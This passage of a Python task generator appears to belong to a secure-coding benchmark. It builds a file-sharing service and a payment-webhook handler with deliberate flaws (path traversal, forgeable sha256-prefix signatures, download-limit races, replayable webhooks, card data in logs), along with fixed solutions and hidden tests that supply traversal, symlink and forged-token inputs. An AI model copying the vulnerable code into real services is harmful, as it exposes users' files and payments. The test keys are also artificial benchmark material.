                    self.assertIsNone(attempt(self.svc.download_headers, name), repr(name))


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

# =================================================================================================================================
#  file sharing
# =================================================================================================================================
SHARE = dd(r'''
    """File sharing with expiring download links (in-process model)."""
    import hashlib
    import os
    import time


    class MemoryStore:
        """The shared counter store. `get`/`set` are individually atomic but not together (other requests run in between); `incr_limited` is the atomic way to count:
        it adds one to the counter `key` unless it already reached `limit`, and returns True when it counted, False when the limit had been reached."""

        def __init__(self):
            self.data = {}

        def get(self, key, default=0):
            return self.data.get(key, default)

        def set(self, key, value):
            self.data[key] = value

        def incr_limited(self, key, limit):
            n = self.data.get(key, 0)
            if n >= limit:
                return False
            self.data[key] = n + 1
            return True


    class ShareService:
        def __init__(self, root, secret, store, clock=time.time):
            self.root, self.secret, self.store, self.clock = root, secret, store, clock
            self.files = {}       # file id -> {"owner", "name", "path"}
            self.next_id = 1

        def upload(self, owner, name, data):
            """Store the bytes of an uploaded file for `owner` and return its file id."""
            file_id = str(self.next_id)
            self.next_id += 1
            path = os.path.join(self.root, owner, name)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as fh:
                fh.write(data)
            self.files[file_id] = {"owner": owner, "name": name, "path": path}
            return file_id

        def list_files(self, user):
            """The ids of the files `user` may see."""
            return sorted(self.files)

        def make_link(self, user, file_id, ttl=3600, max_downloads=1):
            """A download link `<file id>.<expires>.<max downloads>.<signature>` valid for `ttl` seconds and `max_downloads` downloads."""
            expires = int(self.clock()) + ttl
            sig = hashlib.sha256((self.secret + file_id + str(expires)).encode()).hexdigest()
            return "%s.%d.%d.%s" % (file_id, expires, max_downloads, sig)

        def open_link(self, token):
            """The bytes of the file behind a download link; PermissionError for bad, expired or used-up links."""
            file_id, expires, limit, sig = token.split(".")
            expected = hashlib.sha256((self.secret + file_id + expires).encode()).hexdigest()
            if sig != expected:
                raise PermissionError("bad link")
            used = self.store.get("dl:" + token)
            if used >= int(limit):
                raise PermissionError("link used up")
            self.store.set("dl:" + token, used + 1)
            with open(self.files[file_id]["path"], "rb") as fh:
                return fh.read()
''')
SHARE_FIXED = dd(r'''
    """File sharing with expiring download links (in-process model)."""
    import hashlib
    import hmac
    import os
    import re
    import secrets
    import time

    NAME = re.compile(r"[A-Za-z0-9_-][A-Za-z0-9._ -]{0,99}")
    OWNER = re.compile(r"[a-z0-9_]{1,32}")


    class MemoryStore:
        """The shared counter store. `get`/`set` are individually atomic but not together (other requests run in between); `incr_limited` is the atomic way to count:
        it adds one to the counter `key` unless it already reached `limit`, and returns True when it counted, False when the limit had been reached."""

        def __init__(self):
            self.data = {}

        def get(self, key, default=0):
            return self.data.get(key, default)

        def set(self, key, value):
            self.data[key] = value

        def incr_limited(self, key, limit):
            n = self.data.get(key, 0)
            if n >= limit:
                return False
            self.data[key] = n + 1
            return True


    class ShareService:
        def __init__(self, root, secret, store, clock=time.time):
            self.root, self.secret, self.store, self.clock = root, secret, store, clock
            self.files = {}       # file id -> {"owner", "name", "path"}

        def upload(self, owner, name, data):
            """Store the bytes of an uploaded file for `owner` and return its file id."""
            if not isinstance(owner, str) or not OWNER.fullmatch(owner) or not isinstance(name, str) or not NAME.fullmatch(name):
                raise ValueError("bad owner or file name")
            directory = os.path.join(self.root, owner)
            os.makedirs(directory, exist_ok=True)
            path = os.path.join(directory, name)
            fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
            with os.fdopen(fd, "wb") as fh:
                fh.write(data)
            file_id = secrets.token_hex(8)
            self.files[file_id] = {"owner": owner, "name": name, "path": path}
            return file_id

        def list_files(self, user):
            """The ids of the files `user` may see."""
            return sorted(fid for fid, f in self.files.items() if f["owner"] == user)

        def _sign(self, file_id, expires, limit):
            return hmac.new(self.secret.encode(), ("%s|%d|%d" % (file_id, expires, limit)).encode(), hashlib.sha256).hexdigest()

        def make_link(self, user, file_id, ttl=3600, max_downloads=1):
            """A download link `<file id>.<expires>.<max downloads>.<signature>` valid for `ttl` seconds and `max_downloads` downloads."""
            entry = self.files[file_id]
            if entry["owner"] != user:
                raise PermissionError("not your file")
            if not isinstance(ttl, int) or isinstance(ttl, bool) or not 1 <= ttl <= 7 * 86400 or not isinstance(max_downloads, int) or isinstance(max_downloads, bool) or not 1 <= max_downloads <= 100:
                raise ValueError("bad ttl or download limit")
            expires = int(self.clock()) + ttl
            return "%s.%d.%d.%s" % (file_id, expires, max_downloads, self._sign(file_id, expires, max_downloads))

        def open_link(self, token):
            """The bytes of the file behind a download link; PermissionError for bad, expired or used-up links."""
            try:
                file_id, expires, limit, sig = token.split(".")
                expires, limit = int(expires), int(limit)
            except (ValueError, AttributeError):
                raise PermissionError("bad link")
            if not hmac.compare_digest(sig.encode("utf-8"), self._sign(file_id, expires, limit).encode()):
                raise PermissionError("bad link")
            if self.clock() >= expires:
                raise PermissionError("link expired")
            entry = self.files.get(file_id)
            if entry is None:
                raise PermissionError("bad link")
            if not self.store.incr_limited("dl:" + file_id + ":" + sig, limit):
                raise PermissionError("link used up")
            with open(entry["path"], "rb") as fh:
                return fh.read()
''')
FL.append(dict(
    slug="file-share", d=5, product="the file sharing service", func="ShareService", cwe="CWE-639",
    finding="uploads are stored under the client's file name (`../` escapes the storage directory), file ids are a visible counter and `list_files` shows every user's files, anybody can mint a link for any file, the link signature is `sha256(secret + id + expires)` (extendable, not covering the download limit, compared with `==`) and expiry is never enforced, and the download counter is a read-modify-write on the shared store that two simultaneous downloads both pass.",
    start={"share.py": SHARE, "README.md": readme("file sharing", dd(r'''
        Baseline (API unchanged: `upload`, `list_files`, `make_link`, `open_link`, `files`, `store`):

        * `upload(owner, name, data)`: owner `[a-z0-9_]{1,32}`, name `[A-Za-z0-9_-][A-Za-z0-9._ -]{0,99}` (else `ValueError`); the file is `<root>/<owner>/<name>`, created without following links (an existing regular file is replaced); the file id is 16 random hex characters.
        * `list_files(user)`: only the ids of that user's files.
        * `make_link(user, file_id, ttl=3600, max_downloads=1)`: owner only (`PermissionError`, unknown id `KeyError`), `ttl` 1 to 604800 seconds and `max_downloads` 1 to 100 as ints (`ValueError`); the link is `<id>.<expires>.<max>.<signature>` with signature = hex HMAC-SHA256 under the secret of `"<id>|<expires>|<max>"`.
        * `open_link(token)`: any malformed or tampered link, an expired one (`now >= expires`), a vanished file or an used-up link is a `PermissionError`; the signature is compared in constant time; downloads are counted with the store's atomic `incr_limited` (key per file and signature), so concurrent requests cannot exceed the limit.
    '''))},
    solution={"share.py": SHARE_FIXED},
    hidden={"tests/test_share_security.py": P + dd(r'''
        import hashlib
        import hmac
        import signal
        import re

        import share as m

        NOW = 1_700_000_000.0
        SECRET = "share-secret"


        class Clock:
            def __init__(self):
                self.t = NOW

            def __call__(self):
                return self.t


        class RacyStore(m.MemoryStore):
            """The first modifying call is preceded by another client's complete request."""

            def __init__(self):
                super().__init__()
                self.rival = None
                self.fired = False

            def _race(self):
                if self.rival and not self.fired:
                    self.fired = True
                    self.rival()

            def set(self, key, value):
                self._race()
                super().set(key, value)

            def incr_limited(self, key, limit):
                self._race()
                return super().incr_limited(key, limit)


        def reference_signature(file_id, expires, limit):
            return hmac.new(SECRET.encode(), ("%s|%d|%d" % (file_id, expires, limit)).encode(), hashlib.sha256).hexdigest()


        class ShareTest(unittest.TestCase):
            def setUp(self):
                self.base = tmpdir()
                self.addCleanup(shutil.rmtree, self.base, True)
                self.root = os.path.join(self.base, "store")
                os.makedirs(self.root)
                self.clock = Clock()
                self.store = m.MemoryStore()
                self.svc = m.ShareService(self.root, SECRET, self.store, self.clock)

            def test_upload_and_listing(self):
                a = self.svc.upload("ann", "report.pdf", b"AAA")
                b = self.svc.upload("bob", "notes v2.txt", b"BBB")
                a2 = self.svc.upload("ann", "second.txt", b"A2")
                self.assertEqual(len({a, b, a2}), 3)
                for fid in (a, b, a2):
                    self.assertRegex(fid, r"^[0-9a-f]{16}$")
                self.assertEqual(read(os.path.join(self.root, "ann", "report.pdf")), b"AAA")
                self.assertEqual(self.svc.list_files("ann"), sorted([a, a2]))
                self.assertEqual(self.svc.list_files("bob"), [b])
                self.assertEqual(self.svc.list_files("nobody"), [])
                self.svc.upload("ann", "report.pdf", b"AAA2")
                self.assertEqual(read(os.path.join(self.root, "ann", "report.pdf")), b"AAA2")

            def test_upload_names(self):
                before = sorted(os.listdir(self.base))
                for owner, name in [("ann", "../../escape.txt"), ("ann", "/abs.txt"), ("ann", "a/b.txt"), ("ann", ".hidden"), ("ann", ".."), ("ann", ""), ("ann", "x" * 101), ("ann", "a\x00b"), ("ann", "a;b"),
                                    ("../x", "ok.txt"), ("Ann", "ok.txt"), ("", "ok.txt"), ("a" * 33, "ok.txt"), (None, "ok.txt"), ("ann", None)]:
                    self.assertIsNone(attempt(self.svc.upload, owner, name, b"x"), (owner, name))
                self.assertEqual(sorted(os.listdir(self.base)), before)
                self.assertEqual(os.listdir(self.root), [])
                secret = os.path.join(self.base, "secret.txt")
                write(secret, "original secret")
                os.makedirs(os.path.join(self.root, "ann"))
                os.symlink(secret, os.path.join(self.root, "ann", "link.txt"))
                self.assertIsNone(attempt(self.svc.upload, "ann", "link.txt", b"pwned"))
                self.assertEqual(read(secret), b"original secret")

            def test_links(self):
                fid = self.svc.upload("ann", "a.txt", b"hello")
                link = self.svc.make_link("ann", fid, ttl=600, max_downloads=2)
                parts = link.split(".")
                self.assertEqual(parts[0], fid)
                expires = int(NOW) + 600
                self.assertEqual(parts[1:], [str(expires), "2", reference_signature(fid, expires, 2)])
                self.assertEqual(self.svc.open_link(link), b"hello")
                self.assertEqual(self.svc.open_link(link), b"hello")
                with self.assertRaises(PermissionError):
                    self.svc.open_link(link)
                other = self.svc.make_link("ann", fid)
                self.assertEqual(self.svc.open_link(other), b"hello")
                with self.assertRaises(PermissionError):
                    self.svc.open_link(other)

            def test_who_may_link(self):
                fid = self.svc.upload("ann", "a.txt", b"hello")
                with self.assertRaises(PermissionError):
                    self.svc.make_link("bob", fid)
                with self.assertRaises(KeyError):
                    self.svc.make_link("ann", "0" * 16)
                for ttl, limit in [(0, 1), (-5, 1), (7 * 86400 + 1, 1), (60, 0), (60, 101), (60.5, 1), (60, "2"), (True, 1), (60, True), (None, 1)]:
                    self.assertIsNone(attempt(self.svc.make_link, "ann", fid, ttl, limit), (ttl, limit))
                self.assertTrue(self.svc.make_link("ann", fid, 7 * 86400, 100))

            def test_tampering_and_expiry(self):
                fid = self.svc.upload("ann", "a.txt", b"hello")
                other = self.svc.upload("bob", "b.txt", b"secret of bob")
                link = self.svc.make_link("ann", fid, ttl=100, max_downloads=1)
                file_id, expires, limit, sig = link.split(".")
                forged = ["%s.%s.%s.%s" % (file_id, expires, "9999", sig), "%s.%d.%s.%s" % (file_id, int(expires) + 10 ** 6, limit, sig), "%s.%s.%s.%s" % (other, expires, limit, sig),
                          "%s.%s.%s.%s" % (file_id, expires, limit, "0" * 64), "%s.%s.%s." % (file_id, expires, limit), "%s.%s.%s" % (file_id, expires, limit), link + ".x", "", "...", "a.b.c.d", link.upper(),
                          "%s.%s.%s.%s" % (file_id, expires, limit, sig[:-1]), "%s.%s.%s.%s" % (file_id, expires, limit, sig + "0")]
                # a length-extension style link: the old scheme's signature over secret + id + expires
                old = hashlib.sha256((SECRET + file_id + expires).encode()).hexdigest()
                forged.append("%s.%s.%s.%s" % (file_id, expires, limit, old))
                for token in forged:
                    self.assertIsNone(attempt(self.svc.open_link, token), token)
                for value in (None, 5, b"x"):
                    self.assertIsNone(attempt(self.svc.open_link, value))
                self.clock.t += 99
                self.assertEqual(self.svc.open_link(link), b"hello")
                second = self.svc.make_link("ann", fid, ttl=100)
                self.clock.t += 100
                with self.assertRaises(PermissionError):
                    self.svc.open_link(second)

            def test_concurrent_downloads_respect_the_limit(self):
                for limit, rivals in [(1, 1), (2, 2)]:
                    store = RacyStore()
                    svc = m.ShareService(self.root, SECRET, store, self.clock)
                    fid = svc.upload("ann", "r%d.txt" % limit, b"data")
                    link = svc.make_link("ann", fid, ttl=600, max_downloads=limit)
                    results = []

                    def download(label):
                        try:
                            svc.open_link(link)
                            results.append((label, True))
                        except PermissionError:
                            results.append((label, False))

                    def old_alarm(signum, frame):
                        raise TimeoutError("deadlock")

                    previous = signal.signal(signal.SIGALRM, old_alarm)
                    signal.alarm(8)
                    try:
                        def rival():
                            for i in range(rivals):
                                download("rival%d" % i)
                        store.rival = rival
                        for i in range(limit + 1):
                            download("main%d" % i)
                    finally:
                        signal.alarm(0)
                        signal.signal(signal.SIGALRM, previous)
                    self.assertEqual(sum(ok for _, ok in results), limit, results)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

# =================================================================================================================================
#  payment webhooks
# =================================================================================================================================
BILLING = dd(r'''
    """Payment webhooks of the shop (in-process model)."""
    import hashlib
    import json
    import logging
    import time

    log = logging.getLogger("billing")


    class Billing:
        def __init__(self, secret, orders, store, clock=time.time):
            """`secret` is bytes; `orders` maps an order id to `{"total": cents, "currency": "EUR", "status": "pending", "paid": 0}`; `store` offers `put_if_absent(key, value) -> bool` (atomic)."""
            self.secret, self.orders, self.store, self.clock = secret, orders, store, clock

        def handle_webhook(self, headers, body):
            """Process a payment notification: `headers` (dict) and the raw `body` bytes. Returns the HTTP status code."""
            expected = hashlib.sha256(self.secret + body).hexdigest()
            if headers.get("X-Signature") != expected:
                return 401
            event = json.loads(body)
            log.info("webhook %s", event)
            order = self.orders[event["order_id"]]
            order.update(event.get("fields", {}))
            order["paid"] += event["amount"]
            if order["paid"] >= order["total"]:
                order["status"] = "paid"
            return 200
''')
BILLING_FIXED = dd(r'''
    """Payment webhooks of the shop (in-process model)."""
    import hashlib
    import hmac
    import json
    import logging
    import time

    log = logging.getLogger("billing")
    TOLERANCE = 300


    class Billing:
        def __init__(self, secret, orders, store, clock=time.time):
            """`secret` is bytes; `orders` maps an order id to `{"total": cents, "currency": "EUR", "status": "pending", "paid": 0}`; `store` offers `put_if_absent(key, value) -> bool` (atomic)."""
            self.secret, self.orders, self.store, self.clock = secret, orders, store, clock

        def _verify(self, headers, body):
            try:
                ts = int(headers.get("X-Timestamp", ""))
                signature = headers.get("X-Signature", "")
                if not isinstance(signature, str) or abs(self.clock() - ts) > TOLERANCE:
                    return False
                expected = hmac.new(self.secret, b"%d." % ts + body, hashlib.sha256).hexdigest()
                return hmac.compare_digest(expected.encode(), signature.encode("ascii"))
            except (ValueError, TypeError, UnicodeEncodeError):
                return False

        def handle_webhook(self, headers, body):
            """Process a payment notification: `headers` (dict) and the raw `body` bytes. Returns the HTTP status code."""
            if not self._verify(headers, body):
                return 401
            try:
                event = json.loads(body)
            except ValueError:
                return 400
            if not isinstance(event, dict) or not isinstance(event.get("id"), str) or not isinstance(event.get("type"), str):
                return 400
            log.info("webhook event=%s type=%s order=%s", event["id"], event["type"], event.get("order_id"))
            if event["type"] != "payment.succeeded":
                return 200
            amount = event.get("amount")
            if not isinstance(event.get("order_id"), str) or isinstance(amount, bool) or not isinstance(amount, int) or amount <= 0 or not isinstance(event.get("currency"), str):
                return 400
            order = self.orders.get(event["order_id"])
            if order is None:
                return 404
            if not self.store.put_if_absent("event:" + event["id"], True):
                return 200
            if order["status"] == "paid":
                return 409
            if amount != order["total"] or event["currency"] != order["currency"]:
                return 422
            order["paid"] = amount
            order["status"] = "paid"
            return 200
''')
FL.append(dict(
    slug="payment-webhooks", d=5, product="the payment webhook endpoint", func="Billing.handle_webhook", cwe="CWE-345",
    finding="the webhook endpoint authenticates with `sha256(secret + body)` compared by `==` and no timestamp (forgeable and replayable), credits every delivery of an event again (duplicate deliveries pay twice), trusts the amount and currency in the notification instead of the order, copies a `fields` object from the payload onto the order (so a forged event can set any attribute), crashes with a 500 on malformed bodies, and logs the whole payload including card data.",
    start={"billing.py": BILLING, "README.md": readme("payment webhooks", dd(r'''
        Baseline for `Billing.handle_webhook(headers, body)` (the return value is the HTTP status):

        * **Authentication**: headers `X-Timestamp` (integer seconds) and `X-Signature` = hex HMAC-SHA256 under `secret` of `b"<timestamp>." + body`; the timestamp must be within 300 seconds of `clock()`; compared in constant time; anything missing, malformed or wrong is `401`.
        * **Body**: a JSON object with string `id` and `type`; invalid JSON or a missing/mistyped `id`/`type` is `400`. Types other than `payment.succeeded` are acknowledged with `200` and ignored. A `payment.succeeded` event needs a string `order_id`, an int `amount` greater than 0 (no bools) and a string `currency` (else `400`); an unknown order is `404`.
        * **Effects**: an event id is processed once (`store.put_if_absent("event:" + id, True)`); a repeated delivery is acknowledged with `200` and changes nothing. An order that is already paid answers `409`. The amount must equal the order's `total` and the currency the order's `currency`, otherwise `422` and nothing changes. On success `order["paid"]` is the amount and `order["status"]` is `"paid"`. No other field of the order is ever changed by a webhook; extra keys in the event (such as `fields`) are ignored.
        * **Logging**: exactly one INFO record per verified event on the logger `billing`: `webhook event=<id> type=<type> order=<order_id>`. Card numbers and the rest of the payload never appear in logs.
    '''))},
    solution={"billing.py": BILLING_FIXED},
    hidden={"tests/test_billing_security.py": P + dd(r'''
        import hashlib
        import hmac
        import json
        import logging

        import billing as m

        SECRET = b"whsec_test"
        NOW = 1_700_000_000


        class Store:
            def __init__(self):
                self.keys = set()

            def put_if_absent(self, key, value):
                if key in self.keys:
                    return False
                self.keys.add(key)
                return True


        class Capture(logging.Handler):
            def __init__(self):
                super().__init__(logging.DEBUG)
                self.records = []

            def emit(self, record):
                self.records.append(record)


        def sign(body, ts=NOW, secret=SECRET):
            return {"X-Timestamp": str(ts), "X-Signature": hmac.new(secret, b"%d." % ts + body, hashlib.sha256).hexdigest()}


        def event(**kw):
            base = {"id": "evt_1", "type": "payment.succeeded", "order_id": "o1", "amount": 2500, "currency": "EUR"}
            base.update(kw)
            return json.dumps(base).encode()


        class BillingTest(unittest.TestCase):
            def setUp(self):
                self.orders = {"o1": {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0}, "o2": {"total": 900, "currency": "EUR", "status": "paid", "paid": 900}}
                self.b = m.Billing(SECRET, self.orders, Store(), clock=lambda: NOW)
                self.handler = Capture()
                m.log.addHandler(self.handler)
                m.log.setLevel(logging.DEBUG)
                self.addCleanup(m.log.removeHandler, self.handler)

            def test_successful_payment(self):
                body = event()
                self.assertEqual(self.b.handle_webhook(sign(body), body), 200)
                self.assertEqual(self.orders["o1"], {"total": 2500, "currency": "EUR", "status": "paid", "paid": 2500})
                self.assertEqual(self.b.handle_webhook(sign(body), body), 200)
                self.assertEqual(self.orders["o1"]["paid"], 2500)

            def test_authentication(self):
                body = event()
                good = sign(body)
                bad = [{}, {"X-Timestamp": str(NOW)}, {"X-Signature": good["X-Signature"]}, dict(good, **{"X-Signature": "0" * 64}), dict(good, **{"X-Signature": good["X-Signature"].upper()}),
                       sign(body, secret=b"other"), sign(body, ts=NOW - 301), sign(body, ts=NOW + 301), dict(good, **{"X-Timestamp": "abc"}), dict(good, **{"X-Timestamp": str(NOW + 1)}), dict(good, **{"X-Signature": "é" * 64}),
                       {"X-Signature": hashlib.sha256(SECRET + body).hexdigest(), "X-Timestamp": str(NOW)}, {"X-Signature": hashlib.sha256(SECRET + body).hexdigest()}, dict(good, **{"X-Signature": None})]
                for headers in bad:
                    self.assertEqual(self.b.handle_webhook(headers, body), 401, headers)
                fresh = m.Billing(SECRET, {"o1": {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0}}, Store(), clock=lambda: NOW)
                self.assertEqual(fresh.handle_webhook(sign(body, ts=NOW - 300), body), 200)

            def test_no_effect_without_valid_signature(self):
                body = event()
                self.b.handle_webhook({"X-Signature": "00", "X-Timestamp": str(NOW)}, body)
                self.assertEqual(self.orders["o1"], {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0})

            def test_replays_and_duplicates(self):
                body = event(id="evt_9")
                self.assertEqual(self.b.handle_webhook(sign(body), body), 200)
                self.orders["o1"]["status"] = "pending"
                self.orders["o1"]["paid"] = 0
                self.assertEqual(self.b.handle_webhook(sign(body), body), 200)
                self.assertEqual(self.orders["o1"], {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0})
                again = event(id="evt_10")
                self.orders["o1"]["status"] = "paid"
                self.assertEqual(self.b.handle_webhook(sign(again), again), 409)
                body2 = event(id="evt_11", order_id="o2", amount=900)
                self.assertEqual(self.b.handle_webhook(sign(body2), body2), 409)

            def test_amounts_and_currencies(self):
                for kw in ({"amount": 1}, {"amount": 2501}, {"amount": 5000}, {"currency": "USD"}, {"currency": "eur"}):
                    orders = {"o1": {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0}}
                    b = m.Billing(SECRET, orders, Store(), clock=lambda: NOW)
                    body = event(**kw)
                    self.assertEqual(b.handle_webhook(sign(body), body), 422, kw)
                    self.assertEqual(orders["o1"], {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0}, kw)
                for kw, status in (({"amount": 0}, 400), ({"amount": -5}, 400), ({"amount": "2500"}, 400), ({"amount": True}, 400), ({"amount": 25.5}, 400), ({"currency": None}, 400), ({"order_id": 5}, 400),
                                   ({"order_id": "nope"}, 404), ({"id": 5}, 400), ({"type": None}, 400)):
                    b = m.Billing(SECRET, {"o1": {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0}}, Store(), clock=lambda: NOW)
                    body = event(**kw)
                    self.assertEqual(b.handle_webhook(sign(body), body), status, kw)

            def test_malformed_bodies_and_other_types(self):
                for body in (b"not json", b"[1, 2]", b'"x"', b"", b"\xff\xfe", b"null", b"{}", json.dumps({"id": "e", "type": "payment.succeeded"}).encode()):
                    self.assertEqual(self.b.handle_webhook(sign(body), body), 400, body)
                body = event(type="charge.refunded", id="evt_r")
                self.assertEqual(self.b.handle_webhook(sign(body), body), 200)
                self.assertEqual(self.orders["o1"]["paid"], 0)
                self.assertEqual(self.orders["o1"]["status"], "pending")

            def test_payload_cannot_set_fields(self):
                body = event(fields={"status": "paid", "total": 1, "currency": "XXX", "paid": 10 ** 9, "extra": "x"}, status="paid", total=1)
                self.assertEqual(self.b.handle_webhook(sign(body), body), 200)
                self.assertEqual(self.orders["o1"], {"total": 2500, "currency": "EUR", "status": "paid", "paid": 2500})
                orders = {"o1": {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0}}
                b = m.Billing(SECRET, orders, Store(), clock=lambda: NOW)
                body = event(id="evt_f", amount=1, fields={"status": "paid", "total": 1})
                self.assertEqual(b.handle_webhook(sign(body), body), 422)
                self.assertEqual(orders["o1"], {"total": 2500, "currency": "EUR", "status": "pending", "paid": 0})

            def test_logging(self):
                body = event(id="evt_l", card={"number": "4111111111111111", "cvc": "123"}, email="x@example.com")
                self.b.handle_webhook(sign(body), body)
                self.b.handle_webhook(sign(body), body)
                messages = [r.getMessage() for r in self.handler.records]
                self.assertEqual(messages, ["webhook event=evt_l type=payment.succeeded order=o1"] * 2)
                blob = repr([(r.msg, r.args) for r in self.handler.records])
                for secret in ("4111111111111111", "x@example.com", "cvc"):
                    self.assertNotIn(secret, blob)
                bad = {"X-Timestamp": str(NOW), "X-Signature": "00"}
                del self.handler.records[:]
                self.b.handle_webhook(bad, body)
                self.assertEqual(self.handler.records, [])


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

ORDER = ["password-reset-flow", "link-shortener", "report-export", "file-share", "payment-webhooks"]
FL.sort(key=lambda s: (s["d"], ORDER.index(s["slug"])))


@family("security-services", category="security", lang="python", kind="fix", n=5,
        summary="complete small services with five to eight interacting weaknesses: password reset, link shortener, report export, file sharing, payment webhooks")
def gen_services(rng, n):
    return list(_sec.emit(rng, FL[:n], tags=["service", "multi-issue"]))
